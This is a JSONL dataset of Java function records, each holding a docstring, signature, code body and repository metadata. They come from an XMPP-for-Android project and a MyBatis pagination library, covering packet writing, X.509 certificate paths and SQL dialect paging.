{"docstring": "/**\n * Constructor with an audio info.\n * \n * @param audioInfo\n *            the jmf info\n */\n", "func_signal": "public Audio(final PacketExtension audioInfo)", "code": "{\n\tsuper();\n\tthis.audioInfo = audioInfo;\n}", "path": "src\\org\\jivesoftware\\smackx\\provider\\JingleContentInfoProvider.java", "repo_name": "mar-v-in/XMPP-for-Android", "stars": 80, "license": "other", "language": "java", "size": 46442}
{"docstring": "/**\n * Generates certification path object on the base of PkiPath encoded form\n * provided via input stream.\n * \n * @throws CertificateException\n *             if some problems occurred during the decoding.\n */\n", "func_signal": "public static X509CertPathImpl getInstance(InputStream in)\n\t\tthrows CertificateException", "code": "{\n\ttry {\n\t\treturn (X509CertPathImpl) ASN1.decode(in);\n\t} catch (final IOException e) {\n\t\tthrow new CertificateException(Messages.getString(\"security.15E\", //$NON-NLS-1$\n\t\t\t\te.getMessage()));\n\t}\n}", "path": "src\\org\\apache\\harmony\\security\\provider\\cert\\X509CertPathImpl.java", "repo_name": "mar-v-in/XMPP-for-Android", "stars": 80, "license": "other", "language": "java", "size": 46442}
{"docstring": "/**\n * Builds the instance of X509CertPathImpl on the base of the list of\n * ASN.1 encodings of X.509 certificates provided via PkiPath structure.\n * This method participates in decoding process.\n */\n", "func_signal": "@Override\npublic Object getDecodedObject(BerInputStream in) throws IOException", "code": "{\n\t// retrieve the decoded content\n\tfinal List<?> encodings = (List<?>) in.content;\n\tfinal int size = encodings.size();\n\tfinal List<X509Certificate> certificates = new ArrayList<X509Certificate>(\n\t\t\tsize);\n\tfor (int i = 0; i < size; i++) {\n\t\t// create the X.509 certificate on the base of its encoded form\n\t\t// and add it to the list.\n\t\tcertificates.add(new X509CertImpl(\n\t\t\t\t(Certificate) Certificate.ASN1\n\t\t\t\t\t\t.decode((byte[]) encodings.get(i))));\n\t}\n\t// create and return the resulting object\n\treturn new X509CertPathImpl(certificates, PKI_PATH, in.getEncoded());\n}", "path": "src\\org\\apache\\harmony\\security\\provider\\cert\\X509CertPathImpl.java", "repo_name": "mar-v-in/XMPP-for-Android", "stars": 80, "license": "other", "language": "java", "size": 46442}
{"docstring": "/**\n * Returns the next available packet from the queue for writing.\n * \n * @return the next packet for writing.\n */\n", "func_signal": "private Packet nextPacket()", "code": "{\n\tPacket packet = null;\n\t// Wait until there's a packet or we're done.\n\twhile (!done && (packet = queue.poll()) == null) {\n\t\ttry {\n\t\t\tsynchronized (queue) {\n\t\t\t\tqueue.wait();\n\t\t\t}\n\t\t} catch (final InterruptedException ie) {\n\t\t\t// Do nothing\n\t\t}\n\t}\n\treturn packet;\n}", "path": "src\\org\\jivesoftware\\smack\\PacketWriter.java", "repo_name": "mar-v-in/XMPP-for-Android", "stars": 80, "license": "other", "language": "java", "size": 46442}
{"docstring": "/**\n * Returns the value of signatureValue field of the structure.\n * \n * @return signatureValue\n */\n", "func_signal": "public byte[] getSignatureValue()", "code": "{\n\tfinal byte[] result = new byte[signatureValue.length];\n\tSystem.arraycopy(signatureValue, 0, result, 0, signatureValue.length);\n\treturn result;\n}", "path": "src\\org\\apache\\harmony\\security\\x509\\CertificateList.java", "repo_name": "mar-v-in/XMPP-for-Android", "stars": 80, "license": "other", "language": "java", "size": 46442}
{"docstring": "/**\n * Returns the XML representation of a Roster Item Exchange according the\n * specification.\n * \n * Usually the XML representation will be inside of a Message XML\n * representation like in the following example:\n * \n * <pre>\n * &lt;message id=\"MlIpV-4\" to=\"gato1@gato.home\" from=\"gato3@gato.home/Smack\"&gt;\n *     &lt;subject&gt;Any subject you want&lt;/subject&gt;\n *     &lt;body&gt;This message contains roster items.&lt;/body&gt;\n *     &lt;x xmlns=\"jabber:x:roster\"&gt;\n *         &lt;item jid=\"gato1@gato.home\"/&gt;\n *         &lt;item jid=\"gato2@gato.home\"/&gt;\n *     &lt;/x&gt;\n * &lt;/message&gt;\n * </pre>\n * \n */\n", "func_signal": "@Override\npublic String toXML()", "code": "{\n\tfinal StringBuilder buf = new StringBuilder();\n\tbuf.append(\"<\").append(getElementName()).append(\" xmlns=\\\"\")\n\t\t\t.append(getNamespace()).append(\"\\\">\");\n\t// Loop through all roster entries and append them to the string buffer\n\tfor (final Iterator<RemoteRosterEntry> i = getRosterEntries(); i\n\t\t\t.hasNext();) {\n\t\tfinal RemoteRosterEntry remoteRosterEntry = i.next();\n\t\tbuf.append(remoteRosterEntry.toXML());\n\t}\n\tbuf.append(\"</\").append(getElementName()).append(\">\");\n\treturn buf.toString();\n}", "path": "src\\org\\jivesoftware\\smackx\\packet\\RosterExchange.java", "repo_name": "mar-v-in/XMPP-for-Android", "stars": 80, "license": "other", "language": "java", "size": 46442}
{"docstring": "/**\n * TODO\n * \n * @param tbsCertList\n *            : TBSCertList\n * @param signatureAlgorithm\n *            : AlgorithmIdentifier\n * @param signatureValue\n *            : byte[]\n */\n", "func_signal": "public CertificateList(TBSCertList tbsCertList,\n\t\tAlgorithmIdentifier signatureAlgorithm, byte[] signatureValue)", "code": "{\n\tthis.tbsCertList = tbsCertList;\n\tthis.signatureAlgorithm = signatureAlgorithm;\n\tthis.signatureValue = new byte[signatureValue.length];\n\tSystem.arraycopy(signatureValue, 0, this.signatureValue, 0,\n\t\t\tsignatureValue.length);\n}", "path": "src\\org\\apache\\harmony\\security\\x509\\CertificateList.java", "repo_name": "mar-v-in/XMPP-for-Android", "stars": 80, "license": "other", "language": "java", "size": 46442}
{"docstring": "/**\n * Returns the Collection of the encoded form of certificates contained\n * in the X509CertPathImpl object to be encoded. This method\n * participates in encoding process.\n */\n", "func_signal": "@Override\npublic Collection<?> getValues(Object object)", "code": "{\n\t// object to be encoded\n\tfinal X509CertPathImpl cp = (X509CertPathImpl) object;\n\t// if it has no certificates in it - create the sequence of size 0\n\tif (cp.certificates == null) {\n\t\treturn new ArrayList<Object>();\n\t}\n\tfinal int size = cp.certificates.size();\n\tfinal List<byte[]> encodings = new ArrayList<byte[]>(size);\n\ttry {\n\t\tfor (int i = 0; i < size; i++) {\n\t\t\t// get the encoded form of certificate and place it into the\n\t\t\t// list to be encoded in PkiPath format\n\t\t\tencodings.add(cp.certificates.get(i).getEncoded());\n\t\t}\n\t} catch (final CertificateEncodingException e) {\n\t\tthrow new IllegalArgumentException(\n\t\t\t\tMessages.getString(\"security.161\")); //$NON-NLS-1$\n\t}\n\treturn encodings;\n}", "path": "src\\org\\apache\\harmony\\security\\provider\\cert\\X509CertPathImpl.java", "repo_name": "mar-v-in/XMPP-for-Android", "stars": 80, "license": "other", "language": "java", "size": 46442}
{"docstring": "/**\n * Adds a roster entry to the packet.\n * \n * @param rosterEntry\n *            a roster entry to add.\n */\n", "func_signal": "public void addRosterEntry(RosterEntry rosterEntry)", "code": "{\n\t// Obtain a String[] from the roster entry groups name\n\tfinal List<String> groupNamesList = new ArrayList<String>();\n\tString[] groupNames;\n\tfor (final RosterGroup group : rosterEntry.getGroups()) {\n\t\tgroupNamesList.add(group.getName());\n\t}\n\tgroupNames = groupNamesList.toArray(new String[groupNamesList.size()]);\n\n\t// Create a new Entry based on the rosterEntry and add it to the packet\n\tfinal RemoteRosterEntry remoteRosterEntry = new RemoteRosterEntry(\n\t\t\trosterEntry.getUser(), rosterEntry.getName(), groupNames);\n\n\taddRosterEntry(remoteRosterEntry);\n}", "path": "src\\org\\jivesoftware\\smackx\\packet\\RosterExchange.java", "repo_name": "mar-v-in/XMPP-for-Android", "stars": 80, "license": "other", "language": "java", "size": 46442}
{"docstring": "/**\n * Sends the specified packet to the server.\n * \n * @param packet\n *            the packet to send.\n */\n", "func_signal": "public void sendPacket(Packet packet)", "code": "{\n\tif (!done) {\n\t\t// Invoke interceptors for the new packet that is about to be sent.\n\t\t// Interceptors\n\t\t// may modify the content of the packet.\n\t\tconnection.firePacketInterceptors(packet);\n\n\t\ttry {\n\t\t\tqueue.put(packet);\n\t\t} catch (final InterruptedException ie) {\n\t\t\tie.printStackTrace();\n\t\t\treturn;\n\t\t}\n\t\tsynchronized (queue) {\n\t\t\tqueue.notifyAll();\n\t\t}\n\n\t\t// Process packet writer listeners. Note that we're using the\n\t\t// sending\n\t\t// thread so it's expected that listeners are fast.\n\t\tconnection.firePacketSendingListeners(packet);\n\t}\n}", "path": "src\\org\\jivesoftware\\smack\\PacketWriter.java", "repo_name": "mar-v-in/XMPP-for-Android", "stars": 80, "license": "other", "language": "java", "size": 46442}
{"docstring": "/**\n * Creates a new roster exchange package with the entries specified in\n * roster.\n * \n * @param roster\n *            the roster to send to other XMPP entity.\n */\n", "func_signal": "public RosterExchange(Roster roster)", "code": "{\n\t// Add all the roster entries to the new RosterExchange\n\tfor (final RosterEntry rosterEntry : roster.getEntries()) {\n\t\tthis.addRosterEntry(rosterEntry);\n\t}\n}", "path": "src\\org\\jivesoftware\\smackx\\packet\\RosterExchange.java", "repo_name": "mar-v-in/XMPP-for-Android", "stars": 80, "license": "other", "language": "java", "size": 46442}
{"docstring": "//\n// TODO\n// @param tbsCertList: TBSCertList\n// @param signatureAlgorithm: AlgorithmIdentifier\n// @param signatureValue: byte[]\n// @param encoding: byte[]\n//\n", "func_signal": "private CertificateList(TBSCertList tbsCertList,\n\t\tAlgorithmIdentifier signatureAlgorithm, byte[] signatureValue,\n\t\tbyte[] encoding)", "code": "{\n\tthis(tbsCertList, signatureAlgorithm, signatureValue);\n\tthis.encoding = encoding;\n}", "path": "src\\org\\apache\\harmony\\security\\x509\\CertificateList.java", "repo_name": "mar-v-in/XMPP-for-Android", "stars": 80, "license": "other", "language": "java", "size": 46442}
{"docstring": "/**\n * @see java.security.cert.CertPath#getEncoded(String) method documentation\n *      for more info\n */\n", "func_signal": "@Override\npublic byte[] getEncoded(String encoding)\n\t\tthrows CertificateEncodingException", "code": "{\n\tif (!encodings.contains(encoding)) {\n\t\tthrow new CertificateEncodingException(Messages.getString(\n\t\t\t\t\"security.15F\", encoding)); //$NON-NLS-1$\n\t}\n\tif (encodingsArr[0].equals(encoding)) {\n\t\t// PkiPath encoded form\n\t\treturn getEncoded();\n\t} else {\n\t\t// PKCS7 encoded form\n\t\tif (pkcs7Encoding == null) {\n\t\t\tpkcs7Encoding = PKCS7_SIGNED_DATA_OBJECT.encode(this);\n\t\t}\n\t\tfinal byte[] result = new byte[pkcs7Encoding.length];\n\t\tSystem.arraycopy(pkcs7Encoding, 0, result, 0, pkcs7Encoding.length);\n\t\treturn result;\n\t}\n}", "path": "src\\org\\apache\\harmony\\security\\provider\\cert\\X509CertPathImpl.java", "repo_name": "mar-v-in/XMPP-for-Android", "stars": 80, "license": "other", "language": "java", "size": 46442}
{"docstring": "/**\n * Shuts down the packet writer. Once this method has been called, no\n * further packets will be written to the server.\n */\n", "func_signal": "public void shutdown()", "code": "{\n\tdone = true;\n\tsynchronized (queue) {\n\t\tqueue.notifyAll();\n\t}\n}", "path": "src\\org\\jivesoftware\\smack\\PacketWriter.java", "repo_name": "mar-v-in/XMPP-for-Android", "stars": 80, "license": "other", "language": "java", "size": 46442}
{"docstring": "/**\n * Parse a JingleDescription.Audio extension.\n */\n", "func_signal": "@Override\npublic PacketExtension parseExtension(final XmlPullParser parser)\n\t\tthrows Exception", "code": "{\n\tPacketExtension result = null;\n\n\tif (audioInfo != null) {\n\t\tresult = audioInfo;\n\t} else {\n\t\tfinal String elementName = parser.getName();\n\n\t\t// Try to get an Audio content info\n\t\tfinal ContentInfo mi = ContentInfo.Audio\n\t\t\t\t.fromString(elementName);\n\t\tif (mi != null) {\n\t\t\tresult = new JingleContentInfo.Audio(mi);\n\t\t}\n\t}\n\treturn result;\n}", "path": "src\\org\\jivesoftware\\smackx\\provider\\JingleContentInfoProvider.java", "repo_name": "mar-v-in/XMPP-for-Android", "stars": 80, "license": "other", "language": "java", "size": 46442}
{"docstring": "/**\n * Gets sort fileds.\n *\n * @param httpRequest the http request\n * @return the sort fileds\n */\n", "func_signal": "private List<SortField> getSortFileds(final HttpServletRequest httpRequest)", "code": "{\n\n    String sSortingCols = httpRequest.getParameter(I_SORTING_COLS);\n\n    int iSortingCols = Integer.parseInt(sSortingCols);\n    final List<SortField> sortFields = Lists.newArrayListWithCapacity(iSortingCols);\n    String sSortDir;\n    String sColName;\n    String sSortCol;\n    for (int colCount = 0; colCount < iSortingCols; colCount++) {\n        sSortCol = httpRequest.getParameter(I_SORT_COLS + colCount);\n        sSortDir = httpRequest.getParameter(S_SORT_DIR + colCount);\n        sColName = httpRequest.getParameter(S_DATA_PROP + sSortCol);\n        sColName = humpSplit\n                ? CaseFormat.LOWER_CAMEL.to(CaseFormat.LOWER_UNDERSCORE, sColName)\n                : sColName;\n        sortFields.add(new SortField(sColName, sSortDir));\n    }\n    return sortFields;\n}", "path": "src\\main\\java\\org\\mybatis\\pagination\\mvc\\TableParamArgumentResolver.java", "repo_name": "fitzyyf/mybatis-pagination", "stars": 109, "license": "mit", "language": "java", "size": 996}
{"docstring": "/**\n * Gets search param.\n *\n * @param httpRequest the http request\n * @return the search param\n */\n", "func_signal": "private List<SearchField> getSearchParam(final HttpServletRequest httpRequest)", "code": "{\n    int iColumns = Integer.valueOf(httpRequest.getParameter(I_COLUMNS));\n    final List<SearchField> searchFields = Lists.newArrayListWithCapacity(iColumns);\n    boolean regex;\n    boolean searchable;\n    String searchValue;\n    String sColName;\n    final String sSearch = httpRequest.getParameter(S_SEARCH);\n    for (int col = 0; col < iColumns; col++) {\n        searchValue = httpRequest.getParameter(S_SEACHE_VAL + col);\n        sColName = httpRequest.getParameter(S_DATA_PROP + col);\n        sColName = humpSplit\n                ? CaseFormat.LOWER_CAMEL.to(CaseFormat.LOWER_UNDERSCORE, sColName)\n                : sColName;\n        if (!Strings.isNullOrEmpty(searchValue)) {\n            regex = Boolean.valueOf(httpRequest.getParameter(B_REGEX + col));\n            searchable = Boolean.valueOf(httpRequest.getParameter(B_SORTTABLE + col));\n            searchFields.add(new SearchField(sColName, regex, searchable, searchValue));\n        } else if (!Strings.isNullOrEmpty(sSearch)) {\n            searchFields.add(new SearchField(sColName, false, false, sSearch));\n        }\n    }\n    return searchFields;\n}", "path": "src\\main\\java\\org\\mybatis\\pagination\\mvc\\TableParamArgumentResolver.java", "repo_name": "fitzyyf/mybatis-pagination", "stars": 109, "license": "mit", "language": "java", "size": 996}
{"docstring": "/**\n *  \u5185\u90e8\u6784\u5efa\u67e5\u8be2\u6761\u4ef6\u5bf9\u8c61,auth_resources\n */\n", "func_signal": "protected Criteria createCriteriaInternal()", "code": "{\n    Criteria criteria = new Criteria();\n    return criteria;\n}", "path": "src\\test\\java\\org\\mybatis\\pagination\\domain\\ResourcesCriteria.java", "repo_name": "fitzyyf/mybatis-pagination", "stars": 109, "license": "mit", "language": "java", "size": 996}
{"docstring": "/**\n * \u5c06sql\u53d8\u6210\u5206\u9875sql\u8bed\u53e5,\u63d0\u4f9b\u5c06offset\u53calimit\u4f7f\u7528\u5360\u4f4d\u7b26\u53f7(placeholder)\u66ff\u6362.\n * <pre>\n * \u5982mysql\n * dialect.getLimitString(\"select * from user\", 12, \":offset\",0,\":limit\") \u5c06\u8fd4\u56de\n * select * from user limit :offset,:limit\n * </pre>\n *\n * @param sql               \u5b9e\u9645SQL\u8bed\u53e5\n * @param offset            \u5206\u9875\u5f00\u59cb\u7eaa\u5f55\u6761\u6570\n * @param offsetPlaceholder \u5206\u9875\u5f00\u59cb\u7eaa\u5f55\u6761\u6570\uff0d\u5360\u4f4d\u7b26\u53f7\n * @param limitPlaceholder  \u5206\u9875\u7eaa\u5f55\u6761\u6570\u5360\u4f4d\u7b26\u53f7\n * @return \u5305\u542b\u5360\u4f4d\u7b26\u7684\u5206\u9875sql\n */\n", "func_signal": "public String getLimitString(String sql, int offset, String offsetPlaceholder, String limitPlaceholder)", "code": "{\n    int startOfSelect = sql.toLowerCase().indexOf(\"select\");\n\n    StringBuilder pagingSelect = new StringBuilder(sql.length() + 100)\n            .append(sql.substring(0, startOfSelect)) //add the comment\n            .append(\"select * from ( select \") //nest the main query in an outer select\n            .append(getRowNumber(sql)); //add the rownnumber bit into the outer query select list\n\n    if (hasDistinct(sql)) {\n        pagingSelect.append(\" row_.* from ( \") //add another (inner) nested select\n                .append(sql.substring(startOfSelect)) //add the main query\n                .append(\" ) as row_\"); //close off the inner nested select\n    } else {\n        pagingSelect.append(sql.substring(startOfSelect + 6)); //add the main query\n    }\n\n    pagingSelect.append(\" ) as temp_ where rownumber_ \");\n\n    //add the restriction to the outer select\n    if (offset > 0) {\n        //\t\t\tint end = offset + limit;\n        String endString = offsetPlaceholder + \"+\" + limitPlaceholder;\n        pagingSelect.append(\"between \").append(offsetPlaceholder)\n                .append(\"+1 and \").append(endString);\n    } else {\n        pagingSelect.append(\"<= \").append(limitPlaceholder);\n    }\n\n    return pagingSelect.toString();\n}", "path": "src\\main\\java\\org\\mybatis\\pagination\\dialect\\db\\DB2Dialect.java", "repo_name": "fitzyyf/mybatis-pagination", "stars": 109, "license": "mit", "language": "java", "size": 996}
{"docstring": "/**\n * \u5c06sql\u53d8\u6210\u5206\u9875sql\u8bed\u53e5,\u63d0\u4f9b\u5c06offset\u53calimit\u4f7f\u7528\u5360\u4f4d\u7b26\u53f7(placeholder)\u66ff\u6362.\n * <pre>\n * \u5982mysql\n * dialect.getLimitString(\"select * from user\", 12, \":offset\",0,\":limit\") \u5c06\u8fd4\u56de\n * select * from user limit :offset,:limit\n * </pre>\n *\n * @param sql               \u5b9e\u9645SQL\u8bed\u53e5\n * @param offset            \u5206\u9875\u5f00\u59cb\u7eaa\u5f55\u6761\u6570\n * @param offsetPlaceholder \u5206\u9875\u5f00\u59cb\u7eaa\u5f55\u6761\u6570\uff0d\u5360\u4f4d\u7b26\u53f7\n * @param limitPlaceholder  \u5206\u9875\u7eaa\u5f55\u6761\u6570\u5360\u4f4d\u7b26\u53f7\n * @return \u5305\u542b\u5360\u4f4d\u7b26\u7684\u5206\u9875sql\n */\n", "func_signal": "public String getLimitString(String sql, int offset, String offsetPlaceholder, String limitPlaceholder)", "code": "{\n    StringBuilder stringBuilder = new StringBuilder(sql);\n    stringBuilder.append(\" limit \");\n    if (offset > 0) {\n        stringBuilder.append(offsetPlaceholder).append(\",\").append(limitPlaceholder);\n    } else {\n        stringBuilder.append(limitPlaceholder);\n    }\n    return stringBuilder.toString();\n}", "path": "src\\main\\java\\org\\mybatis\\pagination\\dialect\\db\\MySQLDialect.java", "repo_name": "fitzyyf/mybatis-pagination", "stars": 109, "license": "mit", "language": "java", "size": 996}
{"docstring": "/**\n *  \u6e05\u9664\u67e5\u8be2\u6761\u4ef6,auth_resources\n */\n", "func_signal": "public void clear()", "code": "{\n    oredCriteria.clear();\n    orderByClause = null;\n    distinct = false;\n}", "path": "src\\test\\java\\org\\mybatis\\pagination\\domain\\ResourcesCriteria.java", "repo_name": "fitzyyf/mybatis-pagination", "stars": 109, "license": "mit", "language": "java", "size": 996}
{"docstring": "/**\n * Add a LIMIT clause to the given SQL SELECT\n * <p/>\n * The LIMIT SQL will look like:\n * <p/>\n * WITH query AS\n * (SELECT TOP 100 percent ROW_NUMBER() OVER (ORDER BY CURRENT_TIMESTAMP) as __row_number__, * from table_name)\n * SELECT *\n * FROM query\n * WHERE __row_number__ BETWEEN :offset and :lastRows\n * ORDER BY __row_number__\n *\n * @param querySqlString   The SQL statement to base the limit query off of.\n * @param offset           Offset of the first row to be returned by the query (zero-based)\n * @param limit            Maximum number of rows to be returned by the query\n * @param limitPlaceholder limitPlaceholder\n * @return A new SQL statement with the LIMIT clause applied.\n */\n", "func_signal": "private String getLimitString(String querySqlString, int offset, int limit, String limitPlaceholder)", "code": "{\n    StringBuilder pagingBuilder = new StringBuilder();\n    String orderby = getOrderByPart(querySqlString);\n    String distinctStr = \"\";\n\n    String loweredString = querySqlString.toLowerCase();\n    String sqlPartString = querySqlString;\n    if (loweredString.trim().startsWith(\"select\")) {\n        int index = 6;\n        if (loweredString.startsWith(\"select distinct\")) {\n            distinctStr = \"DISTINCT \";\n            index = 15;\n        }\n        sqlPartString = sqlPartString.substring(index);\n    }\n    pagingBuilder.append(sqlPartString);\n\n    // if no ORDER BY is specified use fake ORDER BY field to avoid errors\n    if (StringHelper.isEmpty(orderby)) {\n        orderby = \"ORDER BY CURRENT_TIMESTAMP\";\n    }\n\n    StringBuilder result = new StringBuilder();\n    result.append(\"WITH query AS (SELECT \")\n            .append(distinctStr)\n            .append(\"TOP 100 PERCENT \")\n            .append(\" ROW_NUMBER() OVER (\")\n            .append(orderby)\n            .append(\") as __row_number__, \")\n            .append(pagingBuilder)\n            .append(\") SELECT * FROM query WHERE __row_number__ BETWEEN \")\n            .append(offset + 1).append(\" AND \").append(offset + limit)\n            .append(\" ORDER BY __row_number__\");\n\n    return result.toString();\n}", "path": "src\\main\\java\\org\\mybatis\\pagination\\dialect\\db\\SQLServer2005Dialect.java", "repo_name": "fitzyyf/mybatis-pagination", "stars": 109, "license": "mit", "language": "java", "size": 996}
{"docstring": "/**\n * do mybatis cache with this executor.\n *\n * @param ms        mapped statuement.\n * @param result    database result.\n * @param parameter sql paramater.\n * @param rowBounds row bounds\n * @param <E>       paramter.\n */\n", "func_signal": "private <E> void doCache(MappedStatement ms, PageMyBatis<E> result, Object parameter, RowBounds rowBounds)", "code": "{\n    // if the current of the executor is for CachingExecutor\n    final Cache cache = ms.getCache();\n    // Determine whether the current query cache.\n    if (executor.getClass().isAssignableFrom(CachingExecutor.class) && cache != null) {\n        BoundSql boundSql = ms.getBoundSql(parameter);\n        final CacheKey cacheKey = createCacheKey(ms, parameter, rowBounds, boundSql);\n        if (LOG.isDebugEnabled()) {\n            LOG.debug(\"cache executor the cache's kye  is \" + cacheKey);\n        }\n        cache.putObject(cacheKey, result);\n    }\n}", "path": "src\\main\\java\\org\\mybatis\\pagination\\PaginationExecutor.java", "repo_name": "fitzyyf/mybatis-pagination", "stars": 109, "license": "mit", "language": "java", "size": 996}
{"docstring": "//    @Before\n//    //\u4f7f\u7528\u8be5\u6ce8\u91ca\u4f1a\u4f7f\u7528\u4e8b\u52a1\uff0c\u800c\u4e14\u5728\u6d4b\u8bd5\u5b8c\u6210\u4e4b\u540e\u4f1a\u56de\u6eda\u4e8b\u52a1\uff0c\u4e5f\u5c31\u662f\u8bf4\u5728\u8be5\u65b9\u6cd5\u4e2d\u505a\u51fa\u7684\u4e00\u5207\u64cd\u4f5c\u90fd\u4e0d\u4f1a\u5bf9\u6570\u636e\u5e93\u4e2d\u7684\u6570\u636e\u4ea7\u751f\u4efb\u4f55\u5f71\u54cd\n//    @Rollback(false) //\u8fd9\u91cc\u8bbe\u7f6e\u4e3afalse\uff0c\u5c31\u8ba9\u4e8b\u52a1\u4e0d\u56de\u6eda\n//    public void setUp() throws Exception {\n//        Resources resources;\n//        for (int i = 0; i < 1000; i++) {\n//            resources = new Resources();\n//            resources.setId(UUID.randomUUID().toString());\n//            resources.setName(\"\u6d4b\u8bd5\u6570\u636e\" + i);\n//            resources.setPath(\"test/pageh/\" + i);\n//            resourcesMapper.insertSelective(resources);\n//        }\n//\n//    }\n", "func_signal": "@Test\n    public void testPagaination() throws Exception", "code": "{\n\n        PagingCriteria baseCriteria = PagingCriteria.createCriteria(0, 15, 15);\n        PageMyBatis<Resources> pageMyBatis = resourcesMapper.selectByPage(baseCriteria);\n        for (Resources pageMyBati : pageMyBatis) {\n            System.out.println(pageMyBati);\n        }\n    }", "path": "src\\test\\java\\org\\mybatis\\pagination\\service\\MapperTest.java", "repo_name": "fitzyyf/mybatis-pagination", "stars": 109, "license": "mit", "language": "java", "size": 996}
{"docstring": "/**\n * \u5c06sql\u53d8\u6210\u5206\u9875sql\u8bed\u53e5,\u63d0\u4f9b\u5c06offset\u53calimit\u4f7f\u7528\u5360\u4f4d\u7b26\u53f7(placeholder)\u66ff\u6362.\n * <pre>\n * \u5982mysql\n * dialect.getLimitString(\"select * from user\", 12, \":offset\",0,\":limit\") \u5c06\u8fd4\u56de\n * select * from user limit :offset,:limit\n * </pre>\n *\n * @param sql               \u5b9e\u9645SQL\u8bed\u53e5\n * @param offset            \u5206\u9875\u5f00\u59cb\u7eaa\u5f55\u6761\u6570\n * @param offsetPlaceholder \u5206\u9875\u5f00\u59cb\u7eaa\u5f55\u6761\u6570\uff0d\u5360\u4f4d\u7b26\u53f7\n * @param limitPlaceholder  \u5206\u9875\u7eaa\u5f55\u6761\u6570\u5360\u4f4d\u7b26\u53f7\n * @return \u5305\u542b\u5360\u4f4d\u7b26\u7684\u5206\u9875sql\n */\n", "func_signal": "public String getLimitString(String sql, int offset,\n                             String offsetPlaceholder, String limitPlaceholder)", "code": "{\n    StringBuilder pageSql = new StringBuilder().append(sql);\n    pageSql = offset <= 0\n            ? pageSql.append(\" limit \").append(limitPlaceholder) :\n            pageSql.append(\" limit \").append(limitPlaceholder).append(\" offset \").append(offsetPlaceholder);\n    return pageSql.toString();\n}", "path": "src\\main\\java\\org\\mybatis\\pagination\\dialect\\db\\PostgreSQLDialect.java", "repo_name": "fitzyyf/mybatis-pagination", "stars": 109, "license": "mit", "language": "java", "size": 996}
{"docstring": "/**\n *  \u4e3a\u7cfb\u7edf\u8d44\u6e90\u521b\u5efa\u4e00\u4e2a\u67e5\u8be2\u6761\u4ef6,auth_resources\n */\n", "func_signal": "public Criteria createCriteria()", "code": "{\n    Criteria criteria = createCriteriaInternal();\n    if (oredCriteria.size() == 0) {\n        oredCriteria.add(criteria);\n    }\n    return criteria;\n}", "path": "src\\test\\java\\org\\mybatis\\pagination\\domain\\ResourcesCriteria.java", "repo_name": "fitzyyf/mybatis-pagination", "stars": 109, "license": "mit", "language": "java", "size": 996}
{"docstring": "/**\n * \u5bf9SQL\u53c2\u6570(?)\u8bbe\u503c\n *\n * @param ps              \u8868\u793a\u9884\u7f16\u8bd1\u7684 SQL \u8bed\u53e5\u7684\u5bf9\u8c61\u3002\n * @param mappedStatement MappedStatement\n * @param boundSql        SQL\n * @param parameterObject \u53c2\u6570\u5bf9\u8c61\n * @throws java.sql.SQLException \u6570\u636e\u5e93\u5f02\u5e38\n */\n", "func_signal": "@SuppressWarnings(\"unchecked\")\npublic static void setParameters(PreparedStatement ps, MappedStatement mappedStatement, BoundSql boundSql, Object parameterObject) throws SQLException", "code": "{\n    ErrorContext.instance().activity(\"setting parameters\").object(mappedStatement.getParameterMap().getId());\n    List<ParameterMapping> parameterMappings = boundSql.getParameterMappings();\n    if (parameterMappings != null) {\n        Configuration configuration = mappedStatement.getConfiguration();\n        TypeHandlerRegistry typeHandlerRegistry = configuration.getTypeHandlerRegistry();\n        MetaObject metaObject = parameterObject == null ? null :\n                configuration.newMetaObject(parameterObject);\n        for (int i = 0; i < parameterMappings.size(); i++) {\n            ParameterMapping parameterMapping = parameterMappings.get(i);\n            if (parameterMapping.getMode() != ParameterMode.OUT) {\n                Object value;\n                String propertyName = parameterMapping.getProperty();\n                PropertyTokenizer prop = new PropertyTokenizer(propertyName);\n                if (parameterObject == null) {\n                    value = null;\n                } else if (typeHandlerRegistry.hasTypeHandler(parameterObject.getClass())) {\n                    value = parameterObject;\n                } else if (boundSql.hasAdditionalParameter(propertyName)) {\n                    value = boundSql.getAdditionalParameter(propertyName);\n                } else if (propertyName.startsWith(ForEachSqlNode.ITEM_PREFIX) && boundSql.hasAdditionalParameter(prop.getName())) {\n                    value = boundSql.getAdditionalParameter(prop.getName());\n                    if (value != null) {\n                        value = configuration.newMetaObject(value).getValue(propertyName.substring(prop.getName().length()));\n                    }\n                } else {\n                    value = metaObject == null ? null : metaObject.getValue(propertyName);\n                }\n                TypeHandler typeHandler = parameterMapping.getTypeHandler();\n                if (typeHandler == null) {\n                    throw new ExecutorException(\"There was no TypeHandler found for parameter \" + propertyName + \" of statement \" + mappedStatement.getId());\n                }\n                typeHandler.setParameter(ps, i + 1, value, parameterMapping.getJdbcType());\n            }\n        }\n    }\n}", "path": "src\\main\\java\\org\\mybatis\\pagination\\helpers\\CountHelper.java", "repo_name": "fitzyyf/mybatis-pagination", "stars": 109, "license": "mit", "language": "java", "size": 996}
{"docstring": "/**\n * Instantiates a new Search field.\n *\n * @param field the field\n * @param regex the regex\n * @param searchable the searchable\n * @param value the value\n */\n", "func_signal": "public SearchField(String field, boolean regex, boolean searchable, String value)", "code": "{\n    this.field = field;\n    this.regex = regex;\n    this.searchable = searchable;\n    this.value = value;\n}", "path": "src\\main\\java\\org\\mybatis\\pagination\\dto\\datatables\\SearchField.java", "repo_name": "fitzyyf/mybatis-pagination", "stars": 109, "license": "mit", "language": "java", "size": 996}
{"docstring": "/**\n * \u5c06sql\u53d8\u6210\u5206\u9875sql\u8bed\u53e5,\u63d0\u4f9b\u5c06offset\u53calimit\u4f7f\u7528\u5360\u4f4d\u7b26\u53f7(placeholder)\u66ff\u6362.\n * <pre>\n * \u5982mysql\n * dialect.getLimitString(\"select * from user\", 12, \":offset\",0,\":limit\") \u5c06\u8fd4\u56de\n * select * from user limit :offset,:limit\n * </pre>\n *\n * @param sql               \u5b9e\u9645SQL\u8bed\u53e5\n * @param offset            \u5206\u9875\u5f00\u59cb\u7eaa\u5f55\u6761\u6570\n * @param offsetPlaceholder \u5206\u9875\u5f00\u59cb\u7eaa\u5f55\u6761\u6570\uff0d\u5360\u4f4d\u7b26\u53f7\n * @param limit             \u5206\u9875\u6bcf\u9875\u663e\u793a\u7eaa\u5f55\u6761\u6570\n * @param limitPlaceholder  \u5206\u9875\u7eaa\u5f55\u6761\u6570\u5360\u4f4d\u7b26\u53f7\n * @return \u5305\u542b\u5360\u4f4d\u7b26\u7684\u5206\u9875sql\n */\n", "func_signal": "private String getLimitString(String sql, int offset, String offsetPlaceholder, int limit, String limitPlaceholder)", "code": "{\n    return sql + ((offset > 0) ? \" limit \" + limitPlaceholder + \" offset \"\n            + 